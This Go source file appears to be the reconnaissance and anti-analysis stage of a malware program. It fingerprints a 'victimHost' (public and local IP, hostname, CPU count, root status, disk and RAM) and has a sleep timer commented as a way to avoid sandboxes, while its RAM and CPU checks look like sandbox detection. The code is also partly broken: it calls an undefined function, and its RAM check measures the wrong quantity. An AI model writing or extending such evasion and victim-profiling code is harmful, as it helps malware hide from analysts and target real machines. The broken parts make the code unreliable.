package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"syscall"
	"time"
)

const (
	B  = 1
	KB = 1024 * B
	MB = 1024 * KB
	GB = 1024 * MB
)

var (
	osSystem string
	osPath   string
)

type DiskStatus struct {
	All  uint64 `json:"all"`
	Used uint64 `json:"used"`
	Free uint64 `json:"free"`
}

type hostInfo struct {
	GlobalIP        string
	LocalIP         string
	Hostname        string
	NumberOfCPU     string
	OperatingSystem string
	RamSize         string
	IsRoot          string
	DiskSpaces      DiskStatus
}

func main() {

	victimHost := hostInfo{
		GlobalIP:    GetGlobalIp(),
		LocalIP:     getLocalIp(),
		Hostname:    getHostname(),
		NumberOfCPU: strconv.Itoa(detectNumCPU()),
		//OperatingSystem: detectOS(),
		IsRoot:     strconv.FormatBool(isRoot()),
		DiskSpaces: DiskUsage("/"),
		RamSize:    strconv.FormatBool(ramSizeCheck(2048)),
	}
	fmt.Println(victimHost)
	fmt.Println(helloWorld())
	//disk := DiskUsage("/")
	//fmt.Printf("All: %.2f GB\n", float64(disk.All)/float64(GB))
	//fmt.Printf("Used: %.2f GB\n", float64(disk.Used)/float64(GB))
	//fmt.Printf("Free: %.2f GB\n", float64(disk.Free)/float64(GB))

}

func DiskUsage(path string) (disk DiskStatus) {
	fs := syscall.Statfs_t{}
	err := syscall.Statfs(path, &fs)
	if err != nil {
		return
	}
	disk.All = fs.Blocks * uint64(fs.Bsize)
	disk.Free = fs.Bfree * uint64(fs.Bsize)
	disk.Used = disk.All - disk.Free
	return
}

// func getHostInfromation() map[string]string {
// 	hostInfos := map[string]string{
// 		"\n localIP ":  getLocalIp(),
// 		"\n globalIP ": GetGlobalIp(),
// 		"\n numCPU ":   strconv.Itoa(detectNumCPU()),
// 		"\n os ":       detectOS(),
// 		"\n hostname ": getHostname(),
// 		"\n ram ":      strconv.FormatBool(ramSizeCheck(2048)),
// 		"\n root ":     strconv.FormatBool(isRoot()),
// 		"\n drives ":   fmt.Sprint(disks()),
// 	}
// 	return hostInfos
// }

// func disks() ([]string, error) {
// 	found_drives := []string{}

// 	for _, drive := range "abcdefgh" {
// 		f, err := os.Open("/dev/sd" + string(drive))
// 		if err == nil {
// 			found_drives = append(found_drives, "/dev/sd"+string(drive))
// 			f.Close()
// 		}
// 	}

// 	return found_drives, nil
// }

func isRoot() bool {
	user, err := user.Current()
	if err != nil {
		panic(err)
	}
	if user.Username != "root" {
		return false
	}
	return true
}

func GetGlobalIp() string {
	ip := ""
	for {
		url := "https://api.ipify.org?format=text"
		resp, err := http.Get(url)
		if err != nil {
			log.Printf("%v\n", err)
		}
		defer resp.Body.Close()

		i, _ := ioutil.ReadAll(resp.Body)
		ip = string(i)

		if resp.StatusCode == 200 {
			break
		}
	}

	return ip
}

func getHostname() string {
	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	return hostname
}
func getLocalIp() string {
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	ip := conn.LocalAddr().(*net.UDPAddr).IP

	return fmt.Sprintf("%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3])
}

// Checks Ram Size and prove if RAM is lower than given_RAM returns a bool
func ramSizeCheck(given_Ram int) bool {
	var m runtime.MemStats
	runtime.ReadMemStats(&m)
	ram := m.Sys / 1024
	rmb := uint64(given_Ram)
	return ram < rmb
}

// Timer for sleep
func timerToAvoidSanboxes() {
	time.Sleep(100 * time.Second) // In final must be 8-9 minutes to avoid sanboxes
}

// Detect Number of CPUs
func detectNumCPU() int {
	ncpu := runtime.NumCPU()
	return ncpu
}

// Detect OS
func detectOS() (string, string) {

	os := runtime.GOOS
	switch os {
	case "windows":
		osSystem = "windows"
		osPath = "C:"
	case "darwin":
		osSystem = "mac"
		osPath = "/"
	case "linux":
		osSystem = "linux"
		osPath = "/"
	default:
		osSystem = "N/A"
	}
	return osSystem, osPath
}
